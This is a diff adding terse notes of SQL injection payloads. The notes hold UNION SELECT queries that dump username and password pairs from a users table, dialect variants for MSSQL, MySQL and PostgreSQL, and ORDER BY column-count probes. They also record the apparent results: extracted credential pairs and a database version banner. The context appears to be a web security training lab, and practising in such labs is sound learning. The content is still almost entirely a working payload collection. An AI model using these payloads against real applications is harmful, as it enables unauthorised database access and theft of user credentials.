@@ -1,0 +1,45 @@
+' UNION SELECT username || '~' || password FROM users--
+' UNION SELECT NULL, username || '~' || password FROM users--
+
+' UNION SELECT NULL, version() FROM users--
+' UNION SELECT NULL, database() FROM users--
+
+...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
+
+Mssql 
+
+' UNION SELECT username + '~' + password FROM users--
+
+
+mysql
+
+' UNION SELECT CONCAT(username, '~' , password)FROM users--
+
+
+SELECT version()
+
+
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+
+
+administrator~o0fnakvld6b7mvvjmt4e
+carlos~1qujhb0m13f1vxaz4mkn
+wiener~4yfceaq0cy6znzogrk02
+
+
+PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+
+
+
+
+
+
